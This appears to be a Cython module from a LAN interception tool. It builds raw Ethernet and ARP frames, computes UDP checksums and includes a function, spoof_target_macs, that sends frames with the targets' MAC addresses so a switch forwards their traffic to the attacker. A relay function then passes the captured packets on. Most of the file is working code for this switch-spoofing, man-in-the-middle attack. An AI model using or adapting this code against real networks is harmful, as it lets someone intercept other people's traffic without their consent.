import time
from _socket import htons

from network_layers.Packet cimport Packet
from network_layers.EthernetLayer cimport *
from network_layers.ArpLayer cimport *
from utils.PacketGenerator cimport *

cpdef unsigned int convert_bytes_to_uint_wrap(bytearray data):
    return convert_bytes_to_uint(data)

cdef unsigned int convert_bytes_to_uint(bytearray value):

    """
    Converts value to an unsigned int.
    
    :param value: Bytearray of max length 4 that should be converted to an unsigned int.
    :return: Converted value.
    """
    return (int.from_bytes(value, byteorder='big', signed=False))



cpdef unsigned long convert_bytes_to_ulong_wrap(bytearray data):
    return convert_bytes_to_ulong(data)

cdef unsigned long convert_bytes_to_ulong(bytearray value):

    """
    Converts value greater 4 and smaller 8 bytes to an unsigned long.
    
    :param value: Bytearray with length between 5 ad 8 inclusively.
    :return: Converted value.
    """

    # Assumption: long has 64 bits
    # 11:22:33:44:55:66
    # msb = 11:22
    # lsb = 33:44:55:66

    # 4 msb bytes
    cdef unsigned int msb_bytes
    # 4 lsb bytes
    cdef unsigned int lsb_bytes

    cdef unsigned long result

    if len(value) > 4:
        lsb_bytes = convert_bytes_to_uint(value[len(value) - 4 : len(value)])
        msb_bytes = convert_bytes_to_uint(value[ 0 : len(value) - 4])

        # 4294967296 = 2^32
        result = msb_bytes * 4294967296 + lsb_bytes

        return result
    else:
        return <unsigned long>convert_bytes_to_uint(value)

cdef bytearray convert_int_to_bytes(unsigned int length, unsigned long value):

    """
    Converts an unsigned int to its byte representation of length "length".
    
    :param length: Length of byte representation (if value too large the MSBytes are dropped)
    :param value: Unsigned int to convert to bytearray
    :return: Bytearray of length "length" with representation of "value" as bytes
    """

    cdef unsigned long counter
    cdef unsigned int remainder
    cdef bytearray converted_bytes = bytearray()


    for counter in range(length):
        remainder = value % 256
        # convert to network byte order
        #converted_bytes.append(<unsigned int>(htons(remainder) / 256))
        converted_bytes.append(remainder)
        value = <unsigned long> (value / 256)

    return converted_bytes[::-1]



# Should be moved to a config package. Not jet implemented
# just random values
cdef unsigned long my_mac_address = 0x84D5EEF254DE
# 192.168.249.249
cdef unsigned long my_ip_address = 0xC0A8F9F9

cdef bytearray generate_arp_unlock_packet(unsigned long mac_address, ip_to_mac_assignments):
    cdef EthernetLayer ethernet_layer = EthernetLayer()
    cdef ArpLayer arp_layer = ArpLayer()

    ethernet_layer.fields.src_mac = my_mac_address
    ethernet_layer.fields.dst_mac = 0xffffffffffff

    arp_layer.fields.target_mac = 0xffffffffffff
    arp_layer.fields.source_mac = my_mac_address
    #TODO debug
    print('generating arp unlock packet with mac address', mac_address, 'and ip', ip_to_mac_assignments.get(mac_address))
    arp_layer.fields.target_ip = ip_to_mac_assignments.get(mac_address)
    arp_layer.fields.source_ip = my_ip_address
    arp_layer.fields.opcode = 0x1

    return generate_arp_packet(ethernet_layer, arp_layer)


cdef void unlock_target_and_send_data(write_queue, raw_socket, buffer_size, ip_to_mac_assignments):

    """
    Reads buffer_size packets from write_queue. Unlocks the clients from these packets via arp requests.
    Sends packets out.
    
    :param write_queue: Shared multiprocessing.Manager().Queue() for packets to send
    :param raw_socket: A socket, that is used for all communications.
    :param buffer_size: Number of packets to process at one time. Must be smaller than write_queue.qsize()!!!
    :return: Void
    """

    # buffer of fixed size (reduces overhead)
    cdef list packet_buffer = [None]*buffer_size
    cdef set mac_address_buffer = set()
    cdef Packet packet

    # process buffer_size elements from write_queue
    cdef unsigned int index
    for index in range(buffer_size):
        packet = write_queue.get()
        packet_buffer[index] = packet

        # collect all dest macs of packets to send
        mac_address_buffer.add(packet.ethernet_layer.fields.dst_mac)

    cdef unsigned long mac_address
    cdef bytearray arp_unlock
    for mac_address in mac_address_buffer:
        #TODO debug
        print('a dest mac from the sending queue', mac_address)
        # generate and send an arp packet to unlock the target
        arp_unlock = generate_arp_unlock_packet(mac_address, ip_to_mac_assignments)
        raw_socket.sendall(bytes(arp_unlock))


    # wait for all arp replies --> all targets are unlocked
    # Here could be some advanced logic (e.g. wait for replies, use stored response time for each target, etc.)
    # This logic can / should be implemented... someday
    # For now just wait some time (3 ms) and hope, that all replies have arrived
    time.sleep(0.003)

    # send all data from the packet_buffer
    for packet in packet_buffer:
        try:
            raw_socket.sendall(bytes(packet.packet_data))
        except:
            pass

    # return and continue doing previous stuff (e.g. listening for incoming packets)





cdef void spoof_target_macs(raw_socket, macs_to_spoof_list):

    """
    Spoofs mac addresses of targets.
    Sends out packets with mac addresses of targets, so that the switch thinks, that the target is
    at the port of the attacker and sends all packets with the target mac to the attacker
    (aka mirror port for selected targets)
    
    :param raw_socket: A socket, that should be used for communication.
    :return: Void.
    """

    # here can be a properly designed packet generator, that yields random packet types...
    # but not jet implemented

    # some constant fields (random values)
    cdef bytearray packet
    cdef EthernetLayer ethernet_layer = EthernetLayer()
    cdef ArpLayer arp_layer = ArpLayer()
    ethernet_layer.fields.dst_mac = 0xaabbccddeeff
    arp_layer.fields.target_mac = 0xaabbccddeeff
    arp_layer.fields.target_ip = 0xfd54ab47
    arp_layer.fields.source_ip = 0x45fdab84
    arp_layer.fields.opcode = 0x1

    for mac in macs_to_spoof_list:
        ethernet_layer.fields.src_mac = mac
        arp_layer.fields.source_mac = mac

        packet = generate_arp_packet(ethernet_layer, arp_layer)

    # spoof each mac with 2 packets
        try:
            raw_socket.sendall(bytes(packet))
            raw_socket.sendall(bytes(packet))
        except:
            pass

cdef unsigned int calculate_udp_checksum(Packet packet):

    # make pseudo header
    cdef bytearray pseudo_header = bytearray()
    pseudo_header.extend(convert_int_to_bytes(4, packet.ipv4_layer.fields.source_ip))
    pseudo_header.extend(convert_int_to_bytes(4, packet.ipv4_layer.fields.dest_ip))
    pseudo_header.extend(bytearray([0]))
    pseudo_header.extend(convert_int_to_bytes(1, 17))
    pseudo_header.extend(convert_int_to_bytes(2, packet.udp_layer.fields.length))

    # fill the current checksum of the packet with zeroes
    packet.packet_data[packet.udp_layer.fields.checksum_start : packet.udp_layer.fields.checksum_end] = bytearray([0, 0])

    # append udp data to the pseudo header in order to compute the overall checksum
    pseudo_header.extend(packet.packet_data[packet.ipv4_layer.fields.end_of_header : ])
    cdef unsigned int check_len = len (pseudo_header)
    # append 0 to last byte if length is odd
    if check_len % 2 != 0:
        pseudo_header.extend(bytearray([0]))

    cdef unsigned int checksum = 0
    # sum all words
    for i in range(0, check_len, 2):
        w = (pseudo_header[i] << 8) + pseudo_header[i + 1]
        checksum += w

    # deal with carry bits
    checksum = (checksum >> 16) + (checksum & 0xFFFF)
    # invert result and take last 16 bits of the sum as result
    checksum = ~checksum & 0xFFFF

    #TODO debug
    print('calculate checksum', checksum)
    return checksum




